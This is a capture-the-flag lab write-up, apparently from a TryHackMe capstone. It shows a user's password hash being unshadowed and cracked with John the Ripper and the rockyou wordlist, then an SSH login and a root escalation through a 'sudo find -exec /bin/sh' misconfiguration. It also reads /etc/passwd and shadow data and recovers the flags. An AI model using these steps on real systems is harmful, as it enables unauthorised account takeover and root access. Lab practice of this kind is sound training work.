touch passwd.txt shadow.txt passwords.txt

* Copied missy user unshadowed password hash into "shadow.txt"

missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::

* Copied missy user data from etc/passwd into "passwd.txt".

cat /etc/passwd | grep missy

missy:x:1001:1001::/home/missy:/bin/bash

* Used unshadow to create file crackable by John the Ripper.

unshadow /root/Desktop/Capstone/passwd.txt /root/Desktop/Capstone/shadow.txt > /root/Desktop/Capstone/passwords.txt

* Used John to brute force missy user password.

john --wordlist=/usr/share/wordlists/rockyou.txt /root/Desktop/Capstone/passwords.txt

* Recovered "Password1" for missy user.
* Used SSH to connect to target as missy user.

ssh missy@10.10.91.89

sudo -l : User missy may run the following commands on ip-10-10-91-89: (ALL) NOPASSWD: /usr/bin/find

history

1 ls

2 cd missy/

3 ls

4 cd Do

5 cd Documents

6 ls

7 cat flag1.txt

8 su root

9 quit

10 sudo -l

11 find . -exec /bin/sh \\; -quit

12 find -exec /bin/sh \\; -quit

13 sudo find /home -exec /bin/bash \\;

14 ls

15 cd leonard/

16 cd rootflag/

17 su root

* Recovered flag1.

cat ./Documents/flag1.txt\`

THM-42828719920544

* history output of missy user suggests exploitation of find sudo delegation.
* [GTFObins](https://gtfobins.github.io/gtfobins/find/) confirms exploit.

### **Sudo** <a href="#ysu6him86402" id="ysu6him86402"></a>

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. sudo find . -exec /bin/sh ; -quit

* Used exploit to elevate privileges to root.

find / -name rootflag 2>/bin/null

h-4.2# id

uid=0(root) gid=0(root) groups=0(root) context=unconfined\_u:unconfined\_r:unconfined\_t:s0-s0:c0.c1023

* Searched for "flag2.txt".

find / -name rootflag 2>/bin/null

/home/rootflag

* Recovered flag2.

cat /home/rootflag/flag2.txt

THM-168824782390238
